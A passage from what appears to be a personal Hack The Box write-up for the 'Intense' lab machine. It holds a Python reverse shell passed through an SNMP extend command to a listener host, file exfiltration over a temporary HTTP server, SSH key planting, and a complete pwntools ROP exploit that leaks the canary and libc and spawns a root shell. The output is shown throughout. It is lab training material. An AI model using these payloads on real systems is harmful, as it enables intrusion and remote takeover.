NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"
```

connected to my

after trying a few things realized that some of the internal quotes needed to be escaped for it to run properly

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ nc -lvnp 55541                              
listening on [any] 55541 ...
connect to [10.10.15.100] from (UNKNOWN) [<YOUR_IP>] 60688
$ id && hostname
id && hostname
uid=111(Debian-snmp) gid=113(Debian-snmp) groups=113(Debian-snmp)
intense
```

got a shell back on my waiting nc listener

I ran into an odd quirk with this SNMP shell...whenever I dropped my shell, I'd also lose the ability to reconnect to the box. I'm not sure of the cause, but it took two resets of both my connection pack and my local machine to get it working again. I initially thought I'd lost my whole HTB connection, but after it recurred days later I tried pinging a box I knew was live \(I think I'd accidentally pinged an inactive box earlier, which fooled me into thinking the whole connection was down\).  When it happened yet again, resetting the machine itself resolved it...

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `Debian-snmp`

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ nc -lvnp 55541
listening on [any] 55541 ...
connect to [10.10.15.100] from (UNKNOWN) [<YOUR_IP>] 57960
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
Debian-snmp@intense:/$ export TERM=xterm-256color
export TERM=xterm-256color
Debian-snmp@intense:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
Debian-snmp@intense:/$ id && hostname
id && hostname
uid=111(Debian-snmp) gid=113(Debian-snmp) groups=113(Debian-snmp)
intense
Debian-snmp@intense:/$ sudo -l
sudo -l
[sudo] password for Debian-snmp: 

Debian-snmp@intense:/$ cd home
cd home
Debian-snmp@intense:/home$ ls
ls
user
Debian-snmp@intense:/home$ cd user
cd user
Debian-snmp@intense:/home/user$ ls -la
ls -la
total 76
drwxr-xr-x 5 user user  4096 Jun 29 06:30 .
drwxr-xr-x 3 root root  4096 Nov 16  2019 ..
lrwxrwxrwx 1 root root     9 Nov 23  2019 .bash_history -> /dev/null
-rw-r--r-- 1 user user   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 user user  3771 Apr  4  2018 .bashrc
drwx------ 2 user user  4096 Nov 16  2019 .cache
drwx------ 3 user user  4096 Nov 16  2019 .gnupg
-rwxrwxr-x 1 user user 13152 Nov 16  2019 note_server
-rw-r--r-- 1 user user  3928 Nov 16  2019 note_server.c
-rw-r--r-- 1 user user   807 Apr  4  2018 .profile
-rw-r--r-- 1 root root    75 Nov 23  2019 .selected_editor
drwxr-xr-x 2 user user  4096 Jun 29 09:31 .ssh
-rw-r--r-- 1 user user     0 Nov 16  2019 .sudo_as_admin_successful
-r--r--r-- 1 root root    33 Nov 16  2019 user.txt
-rw------- 1 root root 12427 Nov 23  2019 .viminfo
Debian-snmp@intense:/home/user$ python3 -m http.server 8099
python3 -m http.server 8099
Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
10.10.15.100 - - [07/Nov/2020 18:25:43] "GET /note_server HTTP/1.1" 200 -
10.10.15.100 - - [07/Nov/2020 18:25:47] "GET /note_server.c HTTP/1.1" 200 -
10.10.15.100 - - [07/Nov/2020 18:26:00] "GET /user.txt HTTP/1.1" 200 -
```

Pulled a few interesting files out of `user`'s home directory...then dropped my shell again when I killed the http server \(just after realizing I should have dropped my ssh key there!\)

```text

```

Reading through the note\_server.c source told me the program was expecting a connection to `127.0.0.1` on port 5001.  

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 <YOUR_IP> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/bash' 'nsExtendArgs."command"' = "-c \"/bin/echo ${ssh_key} >> ~/.ssh/authorized_keys\""
NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "/bin/echo ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbT4GbSUckWcD775fh2EvAIst9754Yn0+88VlmfbV9qXiCEUeCrHXiEFc1KYDYnx/3CEUgu8gby04mHtBdP6n8= kac0@kali >> ~/.ssh/authorized_keys"
```

Trying to echo my ssh key into `user`'s account returned a permission denied error, so I tried the same trick for the `Debian-snmp` user and got partial success

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ ssh -i intense.key Debian-snmp@<YOUR_IP>                                                   255 ⨯
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov  7 18:50:59 UTC 2020

  System load:  0.05              Processes:             172
  Usage of /:   6.2% of 39.12GB   Users logged in:       0
  Memory usage: 7%                IP address for ens160: <YOUR_IP>
  Swap usage:   0%

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

181 packages can be updated.
130 updates are security updates.

Last login: Tue Jun 30 09:34:08 2020 from 10.10.14.2
Connection to <YOUR_IP> closed.

┌──(kac0㉿kali)-[~/htb/intense]
└─$ ssh -i intense.key Debian-snmp@<YOUR_IP> "bash --noprofile --norc"                           1 ⨯

┌──(kac0㉿kali)-[~/htb/intense]
└─$ ssh -i intense.key Debian-snmp@<YOUR_IP> "/bin/sh"
```

The key copy succeeded, but I couldn't actually log in and get a shell. I tried a few bypass tricks, yet it appeared to be locked down tight.

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@<YOUR_IP> -i intense.key
```

Even without a login, I could still use SSH to set up a tunnel into the machine without executing any commands.  That proved useful later when I needed to reach a port bound only to localhost.

```text
Debian-snmp@intense:/home/user$ ps -u root
ps -u root
   PID TTY          TIME CMD
     1 ?        00:00:04 systemd
     2 ?        00:00:00 kthreadd
    
...snipped...

  1074 ?        00:00:00 note_server
  1123 ?        00:00:03 snapd
  1125 ?        00:00:00 networkd-dispat
  1137 ?        00:00:00 cron
  1143 ?        00:00:00 irqbalance
  1145 ?        00:00:00 accounts-daemon
  1147 ?        00:00:00 systemd-logind
  1234 ?        00:00:00 unattended-upgr
  1272 tty1     00:00:00 agetty
  1273 ?        00:00:00 polkitd
  1280 ?        00:00:00 nginx
  1414 ?        00:00:00 sshd
  1943 ?        00:00:00 kworker/u256:2
  2483 ?        00:00:00 kworker/0:0
  2713 ?        00:00:00 kworker/u256:1
  3478 ?        00:00:00 kworker/1:2
```

note-server was running as root

## Binary Exploitation

note: had to get help with this, not good with binary exploitation - thank you to ippsec for his amazing walkthrough videos; also the official write-up for the final working script. For some reason I wasnt able to get gdb's breakpoints to work. It kept giving me an error when running after setting a break point on the write@plt address

```text
0x0000000000000d27 <+541>:   callq  0x900 <write@plt>
   0x0000000000000d2c <+546>:   nop
   0x0000000000000d2d <+547>:   mov    -0x8(%rbp),%rax
   0x0000000000000d31 <+551>:   xor    %fs:0x28,%rax
   0x0000000000000d3a <+560>:   je     0xd48 <handle_client+574>
   0x0000000000000d3c <+562>:   jmp    0xd43 <handle_client+569>
   0x0000000000000d3e <+564>:   jmpq   0xb33 <handle_client+41>
   0x0000000000000d43 <+569>:   callq  0x910 <__stack_chk_fail@plt>
   0x0000000000000d48 <+574>:   leaveq 
   0x0000000000000d49 <+575>:   retq   
End of assembler dump.
(gdb) b *0x0000000000000d27
Breakpoint 2 at 0xd27
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/kac0/htb/intense/noteserver 
Warning:
Cannot insert breakpoint 2.
Cannot access memory at address 0xd27
```

kept getting errors when trying to set break points in gdb. I got frustrated with this and moved on to other machines until the box retired and I was able to watch Ippsec's video, and in the end used the exploit from the official write-up.

`gdb ./note_server -ex 'set follow-fork-mode child' -ex 'break 82' -ex 'run'`

Got address of /xf54

I did learn something very useful for the future - compiling with `-ggdb` will compile with source code intact - very useful for analysis and debugging

Wrote a few different Python scripts trying to exploit this, but in the end I needed to look at the official writeup to find out what I had been doing wrong.

```python
from pwn import *
context.binary = './note_server.remote'
e = context.binary
libc = ELF('./libc_remote.so', checksec=False)
p = remote("127.0.0.1", 5001)

def write(size, data):
    p.send("\x01")
    p.send(p8(size))
    p.send(data)

def copy(offset, size):
    p.send("\x02")
    p.send(p16(offset))
    p.send(p8(size))

def read():
    p.send("\x03")

def doRop(rop):
    payload = b"A" * 8 + p64(canary) + b"A" * 8 + bytes(rop)
    write(0xff, payload + b'A' * (0xff - len(payload)))
    for i in range(3):
        write(0xff, "A" * 0xff)
    write(0x04, "A" * 0x4)
    copy(0, len(payload))
    read()
    p.recv(1024 + len(payload))

for i in range(4):
    write(0xff, "A" * 0xff)
write(0x04, "A" * 0x4)

copy(1024, 0xff)
read()

p.recv(1024)

leak = u64(p.recv(8)) # Ignore stack address

canary = u64(p.recv(8))
log.success(f"Leaked canary: {hex(canary)}")

p.recv(8) # Ignore stack address

leak = u64(p.recv(8))
log.success(f"PIE leak : {hex(leak)}")
e.address = leak - 0xf54 # Calculate PIE base
p = remote("127.0.0.1", 5001) # Reconnect

rop = ROP(e)
rop.call(e.plt['write'], [4, e.got['read']])

doRop(rop)
leak = u64(p.recv(8))
log.success(f"Libc leak : {hex(leak)}")
libc.address = leak - libc.sym['read']

p = remote("127.0.0.1", 5001) # Reconnect
rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.execv(binsh, 0)
doRop(rop)

p.interactive()
```

### Root.txt

```text
┌──(kac0㉿kali)-[~/htb/intense]
└─$ python3 ./pwn-note_server2.py
[*] '/home/kac0/htb/intense/note_server'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 127.0.0.1 on port 5001: Done
[+] Leaked canary: 0x9b61993eb04bed00
[+] PIE leak : 0x5608ae82cf54
[+] Opening connection to 127.0.0.1 on port 5001: Done
[*] Loaded 14 cached gadgets for './note_server'
[+] Libc leak : 0x7fa1096c5070
[+] Opening connection to 127.0.0.1 on port 5001: Done
[*] Loading gadgets for '/home/kac0/htb/intense/libc.so.6'
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ hostname
intense
$ cat /root/root.txt
b3e4************************21d7
```
